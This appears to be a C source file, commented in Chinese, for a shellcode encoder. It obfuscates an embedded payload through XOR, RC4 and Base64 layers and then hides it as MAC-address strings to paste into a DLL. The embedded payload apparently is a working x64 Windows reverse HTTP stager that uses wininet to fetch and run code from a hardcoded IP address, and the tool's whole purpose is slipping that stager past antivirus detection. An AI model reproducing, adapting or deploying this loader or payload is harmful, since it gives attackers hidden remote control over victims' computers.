// shellcode_encoder_mac.c - 四层加密工具：XOR + RC4 + Base64 + MAC格式
#define _CRT_SECURE_NO_WARNINGS  // 解决sprintf警告
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// RC4结构体
typedef struct {
    unsigned char S[256];
    int i;
    int j;
} RC4_CTX;

// RC4初始化
void rc4_init(RC4_CTX* ctx, const unsigned char* key, size_t key_len) {
    int i, j;
    unsigned char temp;

    for (i = 0; i < 256; i++) {
        ctx->S[i] = (unsigned char)i;
    }

    j = 0;
    for (i = 0; i < 256; i++) {
        j = (j + ctx->S[i] + key[i % key_len]) & 0xFF;
        temp = ctx->S[i];
        ctx->S[i] = ctx->S[j];
        ctx->S[j] = temp;
    }

    ctx->i = 0;
    ctx->j = 0;
}

// RC4加密
void rc4_crypt(RC4_CTX* ctx, unsigned char* data, size_t len) {
    size_t k;
    unsigned char temp;

    for (k = 0; k < len; k++) {
        ctx->i = (ctx->i + 1) & 0xFF;
        ctx->j = (ctx->j + ctx->S[ctx->i]) & 0xFF;

        temp = ctx->S[ctx->i];
        ctx->S[ctx->i] = ctx->S[ctx->j];
        ctx->S[ctx->j] = temp;

        data[k] ^= ctx->S[(ctx->S[ctx->i] + ctx->S[ctx->j]) & 0xFF];
    }
}

// Base64编码
char* base64_encode(const unsigned char* data, size_t data_len) {
    const char base64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    size_t encoded_len = 4 * ((data_len + 2) / 3);
    char* encoded = (char*)malloc(encoded_len + 1);
    if (!encoded) return NULL;

    size_t i, j;
    for (i = 0, j = 0; i < data_len;) {
        unsigned int octet_a = i < data_len ? data[i++] : 0;
        unsigned int octet_b = i < data_len ? data[i++] : 0;
        unsigned int octet_c = i < data_len ? data[i++] : 0;

        unsigned int triple = (octet_a << 16) + (octet_b << 8) + octet_c;

        encoded[j++] = base64_chars[(triple >> 18) & 0x3F];
        encoded[j++] = base64_chars[(triple >> 12) & 0x3F];
        encoded[j++] = base64_chars[(triple >> 6) & 0x3F];
        encoded[j++] = base64_chars[triple & 0x3F];
    }

    int mod = (int)(data_len % 3);
    if (mod == 1) {
        encoded[encoded_len - 1] = '=';
        encoded[encoded_len - 2] = '=';
    }
    else if (mod == 2) {
        encoded[encoded_len - 1] = '=';
    }

    encoded[encoded_len] = '\0';
    return encoded;
}

// XOR加密
void xor_encrypt(unsigned char* data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

// 将数据转换为MAC地址格式
char** data_to_mac_format(const unsigned char* data, size_t len, int* mac_count) {
    // 每个MAC地址包含6个字节
    *mac_count = (int)((len + 5) / 6);  // 修复类型转换警告
    char** mac_array = (char**)malloc((*mac_count + 1) * sizeof(char*));
    if (!mac_array) return NULL;

    for (int i = 0; i < *mac_count; i++) {
        mac_array[i] = (char*)malloc(18); // XX-XX-XX-XX-XX-XX\0
        if (!mac_array[i]) {
            // 清理已分配的内存
            for (int j = 0; j < i; j++) free(mac_array[j]);
            free(mac_array);
            return NULL;
        }

        // 格式化为MAC地址
        size_t offset = (size_t)i * 6;
        sprintf(mac_array[i], "%02X-%02X-%02X-%02X-%02X-%02X",
            offset < len ? data[offset] : 0,
            offset + 1 < len ? data[offset + 1] : 0,
            offset + 2 < len ? data[offset + 2] : 0,
            offset + 3 < len ? data[offset + 3] : 0,
            offset + 4 < len ? data[offset + 4] : 0,
            offset + 5 < len ? data[offset + 5] : 0
        );
    }

    mac_array[*mac_count] = NULL; // 结束标记
    return mac_array;
}

// 打印C数组格式
void print_c_array(const char* name, const unsigned char* data, size_t len) {
    printf("unsigned char %s[] = {\n    ", name);
    for (size_t i = 0; i < len; i++) {
        printf("0x%02x", data[i]);
        if (i < len - 1) {
            printf(", ");
            if ((i + 1) % 12 == 0) {
                printf("\n    ");
            }
        }
    }
    printf("\n};\n");
}

// 打印MAC地址数组
void print_mac_array(char** mac_array, int count) {
    printf("const char* mac_shellcode[] = {\n");
    for (int i = 0; i < count; i++) {
        printf("    \"%s\",\n", mac_array[i]);
    }
    printf("    NULL  // 结束标记\n");
    printf("};\n");
}

// 验证解密过程
void verify_decryption(const unsigned char* original, size_t len,
    const char* base64, const unsigned char* rc4_key) {
    printf("\n=== Verification Test ===\n");

    // 这里只是展示解密流程，实际解密在DLL中进行
    printf("Decryption order:\n");
    printf("1. MAC format -> Base64 string\n");
    printf("2. Base64 decode -> Binary data\n");
    printf("3. RC4 decrypt -> XOR encrypted data\n");
    printf("4. XOR decrypt (key=0xAB) -> Original shellcode\n");
    printf("\nIf all steps work correctly, the shellcode will execute.\n");
}

int main() {
    // 您的原始shellcode - 这里是示例，请替换为实际的shellcode
    unsigned char original_shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x57\x04\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x66\x4e\x54\x55\x00\x26\x07\x5e\x53\x6d\x5d\xde\x58\xa7\x70\x1a\xb9\x1a\x46\x39\x46\xb0\x6d\x0b\x34\xa8\xb5\x9f\xfb\x6b\x16\x63\x1a\x06\x72\x5c\xab\xda\x7e\x57\xf6\x14\x98\x8d\xf8\x90\xf1\xde\x5a\x93\x4d\xc3\xc7\x14\x43\x95\x4c\xa9\xdd\x5e\xb1\xa4\xcd\x57\xb5\xec\x3a\xe6\xde\xb1\xe3\xfa\x01\x20\x67\x9c\x5b\x5b\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x34\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x37\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x35\x2e\x31\x3b\x20\x2e\x4e\x45\x54\x20\x43\x4c\x52\x20\x32\x2e\x30\x2e\x35\x30\x37\x32\x37\x29\x0d\x0a\x00\x23\xcd\x88\x4e\x1c\xd5\x05\xea\x4e\xe2\xc9\x2e\x07\x6d\xb8\xf4\xd0\xf8\xa5\x57\x8c\x82\x42\x43\x48\xe3\xa4\x68\x36\xb4\xbc\xbf\x65\x5a\x24\xdb\xc6\xdf\x6b\x32\x59\x25\x0a\xed\x44\xdd\x6b\xae\xfe\x85\x0e\x28\x8f\x15\x34\x81\x4a\xb7\x2b\x4a\xa8\xdd\x34\x1d\x48\xc2\x92\x32\x4b\x40\x61\x37\x87\x70\x12\xf1\x36\x31\x3c\x54\xce\x1f\xf3\x82\xef\xfb\x37\xf5\x33\xd5\x8b\xcb\x5a\x21\x70\x8c\xc5\x46\x6e\xce\x77\x0e\xaa\xf6\x87\x52\x95\xc8\xe1\xa8\x29\x8c\xf5\x51\xc9\x87\xce\x69\xa0\x3a\xba\x52\xd7\xed\x19\xab\x77\x97\xe0\xc9\xa0\xde\x62\xd6\x0e\x2e\xa1\x1f\x1c\xd3\xad\x5f\x3b\x7c\x1e\x3d\x6e\xcb\xf5\x9b\x00\x99\xf3\x6b\x81\xc0\xd8\x5d\xe5\x2c\x2a\x60\x19\x4c\x2d\xb9\xa9\x63\xb5\x1d\x8f\xa4\x87\x73\x3f\xe3\x71\xec\x4e\x32\xbe\xe2\x2f\x2d\xea\x82\x3c\x58\xb6\xeb\xd0\x1d\x97\xe9\x2a\x74\xe4\xe9\x96\x25\x4b\x51\x3e\xa1\x09\xad\x9b\x08\xfe\x55\x42\x94\xc8\x2a\x52\xcd\x74\xd2\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x34\x37\x2e\x31\x30\x39\x2e\x31\x37\x37\x2e\x39\x37\x00\x3a\xde\x68\xb1";


    size_t shellcode_len = sizeof(original_shellcode);

    // RC4密钥
    unsigned char rc4_key[] = "MySecretKey123!@#";

    // 创建工作副本
    unsigned char* shellcode = (unsigned char*)malloc(shellcode_len);
    if (!shellcode) {
        printf("Memory allocation failed\n");
        return 1;
    }
    memcpy(shellcode, original_shellcode, shellcode_len);

    printf("=== Shellcode Encoder (XOR + RC4 + Base64 + MAC) ===\n\n");
    printf("Original shellcode length: %zu bytes\n", shellcode_len);
    printf("RC4 key: %s\n", rc4_key);
    printf("XOR key: 0xAB\n\n");

    // 打印原始shellcode
    printf("1. Original shellcode:\n");
    print_c_array("original_shellcode", original_shellcode, shellcode_len);
    printf("\n");

    // 第1层：XOR加密
    xor_encrypt(shellcode, shellcode_len, 0xAB);
    printf("2. After XOR encryption (key=0xAB):\n");
    print_c_array("xor_encrypted", shellcode, shellcode_len);
    printf("\n");

    // 第2层：RC4加密
    RC4_CTX rc4_ctx;
    rc4_init(&rc4_ctx, rc4_key, strlen((char*)rc4_key));
    rc4_crypt(&rc4_ctx, shellcode, shellcode_len);
    printf("3. After RC4 encryption:\n");
    print_c_array("rc4_encrypted", shellcode, shellcode_len);
    printf("\n");

    // 第3层：Base64编码
    char* base64_encoded = base64_encode(shellcode, shellcode_len);
    if (!base64_encoded) {
        printf("Base64 encoding failed\n");
        free(shellcode);
        return 1;
    }

    printf("4. After Base64 encoding:\n");
    printf("const char base64_shellcode[] = \"%s\";\n", base64_encoded);
    printf("Base64 length: %zu bytes\n\n", strlen(base64_encoded));

    // 第4层：转换为MAC地址格式
        // 第4层：转换为MAC地址格式
    int mac_count;
    char** mac_array = data_to_mac_format((unsigned char*)base64_encoded, strlen(base64_encoded), &mac_count);
    if (!mac_array) {
        printf("MAC format conversion failed\n");
        free(shellcode);
        free(base64_encoded);
        return 1;
    }

    printf("5. After MAC address format conversion:\n");
    printf("MAC count: %d addresses\n", mac_count);
    print_mac_array(mac_array, mac_count);
    printf("\n");

    // 生成用于DLL的代码片段
    printf("\n=== Copy this to your DLL ===\n\n");
    printf("// Four-layer encrypted shellcode (XOR + RC4 + Base64 + MAC)\n");
    printf("// Decryption order: MAC -> Base64 decode -> RC4 decrypt -> XOR decrypt\n");
    print_mac_array(mac_array, mac_count);
    printf("\n");
    printf("// RC4 key (keep this secret!)\n");
    printf("const unsigned char rc4_key[] = \"%s\";\n\n", rc4_key);

    // 验证解密流程
    verify_decryption(original_shellcode, shellcode_len, base64_encoded, rc4_key);

    // 清理内存
    free(shellcode);
    free(base64_encoded);

    // 清理MAC数组
    for (int i = 0; i < mac_count; i++) {
        free(mac_array[i]);
    }
    free(mac_array);

    printf("\n=== Encoding Complete ===\n");
    printf("Total encryption layers: 4\n");
    printf("1. XOR (key=0xAB)\n");
    printf("2. RC4 (key=%s)\n", rc4_key);
    printf("3. Base64 encoding\n");
    printf("4. MAC address format\n");
    printf("\nRemember to update the mac_shellcode array in your DLL!\n");

    return 0;
}
